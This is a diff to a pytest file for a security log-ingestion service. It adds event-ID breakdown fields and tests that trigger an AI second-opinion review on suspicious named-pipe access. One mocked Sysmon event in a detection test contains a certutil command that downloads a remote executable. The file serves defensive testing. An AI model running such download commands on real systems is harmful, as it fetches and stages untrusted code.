@@ -42,6 +42,7 @@ def test_ingest_sysmon_demo_happy_path(api_client):
         "records_read": 4,
         "events_ingested": 4,
         "events_skipped": 0,
+        "duplicate_events_skipped": 0,
         "rule_matches": 0,
         "matched_rule_titles": [],
         "alerts_created": 0,
@@ -50,6 +51,12 @@ def test_ingest_sysmon_demo_happy_path(api_client):
         "uncovered_events": 0,
         "uncovered_breakdown": [],
         "ai_opinion_id": None,
+        "channels": ["Microsoft-Windows-Sysmon/Operational"],
+        "providers": ["Microsoft-Windows-Sysmon"],
+        "event_id_breakdown": [
+            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1, "count": 3, "covered": True},
+            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 11, "count": 1, "covered": True},
+        ],
     }
     with SessionLocal() as db:
         assert db.query(Event).count() == 4
@@ -140,6 +147,7 @@ def test_ingest_skips_malformed_records_and_ingests_the_rest(api_client, monkeyp
         "records_read": 3,
         "events_ingested": 2,
         "events_skipped": 1,
+        "duplicate_events_skipped": 0,
         "rule_matches": 0,
         "matched_rule_titles": [],
         "alerts_created": 0,
@@ -148,6 +156,12 @@ def test_ingest_skips_malformed_records_and_ingests_the_rest(api_client, monkeyp
         "uncovered_events": 0,
         "uncovered_breakdown": [],
         "ai_opinion_id": None,
+        "channels": ["Microsoft-Windows-Sysmon/Operational"],
+        "providers": [],
+        "event_id_breakdown": [
+            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1, "count": 1, "covered": True},
+            {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 11, "count": 1, "covered": True},
+        ],
     }
     with SessionLocal() as db:
         assert db.query(Event).count() == 2
@@ -254,3 +268,111 @@ def test_ingest_does_not_trigger_ai_opinion_when_fully_covered_and_clean(api_cli
     assert body["rule_matches"] == 0
     assert body["uncovered_events"] == 0
     assert body["ai_opinion_id"] is None
+
+
+# -- AI second opinion trigger (advisory-pattern flag, e.g. named-pipe ------
+# discovery) -- independent of the uncovered/zero-match trigger above -----
+
+
+def _pipe_record(pipe_name, image="System", channel="Microsoft-Windows-Sysmon/Operational"):
+    return {
+        "Event": {
+            "System": _system("18", channel=channel),
+            "EventData": {
+                "Data": [
+                    {"@Name": "Image", "#text": image},
+                    {"@Name": "PipeName", "#text": pipe_name},
+                ]
+            },
+        }
+    }
+
+
+def test_ingest_triggers_ai_opinion_for_named_pipe_discovery_even_when_event_id_is_covered(api_client, monkeypatch):
+    """event_id 18 (pipe_event) is a covered category via the real
+    rogue_spoolss_named_pipe.yml rule, so this file is NOT the
+    uncovered-events path -- the advisory flag must fire on its own."""
+    client, SessionLocal = api_client
+    monkeypatch.setattr(
+        "app.api.routes_ingest.read_records_as_dicts",
+        lambda path: iter([_pipe_record("\\lsass")]),
+    )
+    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
+    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
+    monkeypatch.setattr(
+        "app.services.ai_opinion_service.generate",
+        lambda messages: "Worth a look.\n\n## Assessment: Worth reviewing",
+    )
+
+    response = client.post(
+        "/ingest",
+        files={"file": ("pipe_discovery.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
+    )
+
+    assert response.status_code == 200
+    body = response.json()
+    assert body["rule_matches"] == 0
+    assert body["uncovered_events"] == 0  # genuinely covered, not the uncovered-events path
+    assert body["ai_opinion_id"] is not None
+
+    opinion = client.get(f"/ai-opinions/{body['ai_opinion_id']}").json()
+    assert opinion["status"] == "ready"
+    assert opinion["assessment_label"] == "worth_reviewing"
+
+
+def test_ingest_triggers_ai_opinion_for_named_pipe_discovery_alongside_a_real_rule_match(api_client, monkeypatch):
+    """The pipe connect and an unrelated real detection can both be true in
+    the same file -- the advisory flag must fire even though rule_matches
+    is nonzero, unlike the uncovered-events trigger."""
+    client, SessionLocal = api_client
+    monkeypatch.setattr(
+        "app.api.routes_ingest.read_records_as_dicts",
+        lambda path: iter(
+            [
+                {
+                    "Event": {
+                        "System": _system("1", channel="Microsoft-Windows-Sysmon/Operational"),
+                        "EventData": {
+                            "Data": [
+                                {"@Name": "Image", "#text": "certutil.exe"},
+                                {"@Name": "CommandLine", "#text": "certutil.exe -urlcache -split -f http://x/a.exe"},
+                            ]
+                        },
+                    }
+                },
+                _pipe_record("\\srvsvc"),
+            ]
+        ),
+    )
+    monkeypatch.setattr("app.services.ai_opinion_service.SessionLocal", SessionLocal)
+    monkeypatch.setattr("app.services.ai_opinion_service.retrieve", lambda query, k: [])
+    monkeypatch.setattr(
+        "app.services.ai_opinion_service.generate",
+        lambda messages: "Worth a look.\n\n## Assessment: Worth reviewing",
+    )
+
+    response = client.post(
+        "/ingest",
+        files={"file": ("mixed.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
+    )
+
+    assert response.status_code == 200
+    body = response.json()
+    assert body["rule_matches"] >= 1
+    assert body["ai_opinion_id"] is not None
+
+
+def test_ingest_does_not_trigger_ai_opinion_for_unrelated_pipe_activity(api_client, monkeypatch):
+    client, _SessionLocal = api_client
+    monkeypatch.setattr(
+        "app.api.routes_ingest.read_records_as_dicts",
+        lambda path: iter([_pipe_record("\\wkssvc")]),
+    )
+
+    response = client.post(
+        "/ingest",
+        files={"file": ("benign_pipe.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
+    )
+
+    assert response.status_code == 200
+    assert response.json()["ai_opinion_id"] is None
